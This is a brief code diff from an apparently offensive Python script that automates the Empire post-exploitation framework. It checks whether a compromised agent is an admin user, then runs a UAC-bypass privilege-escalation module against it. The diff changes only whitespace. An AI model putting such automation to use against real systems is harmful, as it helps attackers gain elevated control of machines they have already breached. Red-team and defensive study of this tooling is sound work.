@@ -19,8 +19,8 @@ try:
     admin_type = empire_is_user_admin.run(API, agent['name']) 
     if admin_type is None:
         raise ValueError('BypassUAC can only be used with admin user')
-
     # else we could do more things to try to EoP    
+    
     empire_bypassUAC.run(API, agent['name'], privesc.bypassuac.path)
 
     # wait for non-privilege agent
